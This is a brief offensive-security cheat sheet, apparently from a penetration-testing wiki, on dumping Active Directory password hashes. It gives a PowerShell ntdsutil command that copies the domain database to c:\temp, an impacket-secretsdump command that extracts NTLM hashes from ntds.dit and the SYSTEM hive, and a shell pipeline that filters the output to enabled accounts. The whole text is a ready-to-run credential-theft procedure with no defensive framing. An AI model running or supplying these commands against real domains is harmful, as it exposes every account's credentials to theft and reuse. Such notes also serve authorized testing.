# Dumping domain hashes

## NTDSutil&#x20;

```
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```

Then pull the hashes out with Impacket's Secretdump

```
impacket-secretsdump -system SYSTEM -ntds ntds.dit -hashes lmhash:nthash -user-status -outputfile myhashes local
```

The tidy up the hashes

```
cat myhashes.ntds | grep -v "$:" | grep "status=Enabled" | cut -d'\' -f2 | cut -d"(" -f1
```
